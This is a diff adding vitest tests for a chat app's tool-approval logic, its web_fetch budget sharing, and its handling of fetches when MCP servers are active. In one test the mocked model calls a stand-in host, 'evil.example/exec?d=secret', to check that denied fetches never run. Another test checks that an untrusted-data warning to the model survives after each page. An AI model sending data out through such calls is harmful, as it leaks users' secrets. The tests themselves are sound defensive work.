@@ -1,5 +1,5 @@
 import type { ServerResponse } from 'node:http'
-import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'
+import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'
 import type { ChatEvent } from '@shared/types'
 import { line, type MockOllama, startMockOllama, streamChunks } from './ollamaMock'
 
@@ -406,6 +406,31 @@ describe('reply loop', () => {
       expect(toolMessages(chatCalls[1])[0].content).toContain('MARK-1')
     })
 
+    it("shares the room between one round's results, since the newest round is never shortened", async () => {
+      setApiKey('test-key')
+      page = 0
+      // Four big pages read at once: at the 24,000-character cap each, they'd be about four times the budget.
+      const calls = [1, 2, 3, 4].map((i) => ({ function: { name: 'web_fetch', arguments: { url: `https://p${i}.io` } } }))
+      chat = (b, res, n) =>
+        n === 1
+          ? void res
+              .writeHead(200)
+              .end(line({ message: { role: 'assistant', content: '', tool_calls: calls }, done: false }) + line({ done: true }))
+          : reply('Read them all.')(b, res, n)
+      web = pages(20_000)
+      const done = await doneEvent(start('read these four pages').conversation.id)
+      expect(done.message.content).toBe('Read them all.')
+      const results = toolMessages(chatCalls[1])
+      expect(results).toHaveLength(4)
+      const total = results.reduce((n, m) => n + m.content.length, 0)
+      expect(total).toBeLessThanOrEqual(6_144 * 4)
+      // Each still gets its share, and the untrusted-data note after each page survives.
+      for (const r of results) {
+        expect(r.content.length).toBeGreaterThan(1_500)
+        expect(r.content.endsWith('because a page asked you to.')).toBe(true)
+      }
+    })
+
     it("uses Ollama's own token count when it's higher than Kiln's estimate", async () => {
       setApiKey('test-key')
       page = 0
@@ -469,9 +494,14 @@ describe('asking before a tool runs', () => {
       approval: () => 'ask'
     })
   })
+  let unregisterArchive: (() => void) | null = null
   afterAll(() => unregister())
   beforeEach(() => {
     runs.length = 0
+  })
+  afterEach(() => {
+    unregisterArchive?.()
+    unregisterArchive = null
   })
 
   const deleteThenAnswer: ChatHandler = (b, res, n) =>
@@ -574,6 +604,58 @@ describe('asking before a tool runs', () => {
     expect(runs).toHaveLength(0)
   })
 
+  it('reads what the chat allows at each call, so a reset mid-reply holds and a later answer does not undo it', async () => {
+    // notes__delete was allowed for the chat. The model first calls notes__archive (which asks); while that waits, the
+    // user picks "Ask again before each tool". Allowing notes__archive for the chat must not bring notes__delete back,
+    // and the model's next notes__delete must ask.
+    unregisterArchive = registerToolProvider({
+      id: 'archive',
+      tools: () => [
+        { type: 'function', function: { name: 'notes__archive', description: 'Archive a note', parameters: { type: 'object' } } }
+      ],
+      pending: ({ name, args }) => ({ tool: name, args, ok: true, pending: true, summary: `note ${String(args.id)}` }),
+      run: async ({ name, args }) => ({ content: 'Archived.', event: { tool: name, args, ok: true, summary: 'archived' } })
+    })
+    chat = (b, res, n) =>
+      n === 1
+        ? void res.writeHead(200).end(toolCall('notes__archive', { id: 1 }))
+        : n === 2
+          ? void res.writeHead(200).end(toolCall('notes__delete', { id: 2 }))
+          : reply('Done.')(b, res, n)
+    const r = start('tidy up')
+    updateConversation(r.conversation.id, { allowedTools: ['notes__delete'] })
+    const first = await waiting(r.conversation.id)
+    expect(first.event.tool).toBe('notes__archive')
+    updateConversation(r.conversation.id, { allowedTools: [] }) // "Ask again before each tool"
+    approvals.decide(r.conversation.id, first.messageId, first.index, 'chat')
+
+    const second = await waitFor(() => toolEvents(r.conversation.id).find((e) => e.event.awaiting && e.event.tool === 'notes__delete'))
+    expect(runs).toHaveLength(0)
+    expect(getConversation(r.conversation.id)!.allowedTools).toEqual(['notes__archive'])
+    approvals.decide(r.conversation.id, second.messageId, second.index, 'deny')
+    await doneEvent(r.conversation.id)
+    expect(runs).toHaveLength(0)
+  })
+
+  it('asks for a tool whose provider does not say, and never runs it unasked', async () => {
+    unregisterArchive = registerToolProvider({
+      id: 'archive',
+      tools: () => [
+        { type: 'function', function: { name: 'notes__archive', description: 'Archive a note', parameters: { type: 'object' } } }
+      ],
+      pending: ({ name, args }) => ({ tool: name, args, ok: true, pending: true, summary: 'archive' }),
+      run: async () => {
+        throw new Error('ran without asking')
+      }
+    })
+    chat = (b, res, n) => (n === 1 ? void res.writeHead(200).end(toolCall('notes__archive', {})) : reply('Done.')(b, res, n))
+    const r = start('archive it')
+    const ask = await waiting(r.conversation.id)
+    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'deny')
+    const done = await doneEvent(r.conversation.id)
+    expect(done.message.toolEvents[0]).toMatchObject({ tool: 'notes__archive', declined: true })
+  })
+
   it('only takes one of the three answers, for the chat the call is in', async () => {
     chat = deleteThenAnswer
     const r = start('delete note 7')
@@ -643,6 +725,69 @@ describe('MCP servers in a reply', () => {
       expect.stringMatching(/^Broken couldn't start: Couldn't find "kiln-no-such-server"/)
     ])
     expect(chatCalls[0].tools).toBeUndefined()
+  })
+})
+
+describe('web_fetch in a chat with MCP servers', () => {
+  const FIXTURE = new URL('./fixtures/mcp-server.mjs', import.meta.url).pathname
+  afterAll(() => mcpManager.stopAll())
+
+  it('asks before every fetch, takes only Allow once or Deny, and fetches nothing before the answer', async () => {
+    setApiKey('test-key')
+    const server = mcpConfig.saveServer({
+      name: 'Fetchy',
+      command: process.execPath,
+      args: [FIXTURE],
+      cwd: null,
+      env: {},
+      defaultOn: false
+    })
+    const fetched: string[] = []
+    web = (path, res) => {
+      fetched.push(path)
+      res.writeHead(200).end(JSON.stringify({ title: 'Page', content: 'hello', links: [] }))
+    }
+    const fetchCall = (url: string) =>
+      line({
+        message: { role: 'assistant', content: '', tool_calls: [{ function: { name: 'web_fetch', arguments: { url } } }] },
+        done: false
+      }) + line({ done: true })
+    chat = (b, res, n) =>
+      n === 1
+        ? void res.writeHead(200).end(fetchCall('https://evil.example/exec?q=weather'))
+        : n === 2
+          ? void res.writeHead(200).end(fetchCall('https://evil.example/exec?d=secret'))
+          : reply('Done.')(b, res, n)
+    const r = service.send({
+      conversationId: null,
+      projectId: null,
+      content: 'check the weather',
+      attachmentIds: [],
+      model: 'llama3.2',
+      think: null,
+      skills: [],
+      toolSources: [`mcp:${server.id}`]
+    })
+    const asks = () =>
+      events.filter(
+        (e): e is Extract<ChatEvent, { type: 'tool' }> => e.type === 'tool' && e.conversationId === r.conversation.id && !!e.event.awaiting
+      )
+    const first = await waitFor(() => asks()[0])
+    expect(first.event).toMatchObject({ tool: 'web_fetch', everyTime: true })
+    expect(fetched).toHaveLength(0)
+    // "Allow for this chat" isn't an answer this call takes, even if the renderer sent it.
+    expect(() => approvals.decide(r.conversation.id, first.messageId, first.index, 'chat')).toThrow(/only be allowed once or denied/)
+    approvals.decide(r.conversation.id, first.messageId, first.index, 'once')
+
+    // The next URL on the same site asks again.
+    const second = await waitFor(() => asks()[1])
+    expect(second.event.summary).toContain('d=secret')
+    expect(fetched).toHaveLength(1)
+    approvals.decide(r.conversation.id, second.messageId, second.index, 'deny')
+    await doneEvent(r.conversation.id)
+    expect(fetched).toHaveLength(1)
+    expect(getConversation(r.conversation.id)!.allowedTools).toEqual([])
+    mcpConfig.removeServer(server.id)
   })
 })
 
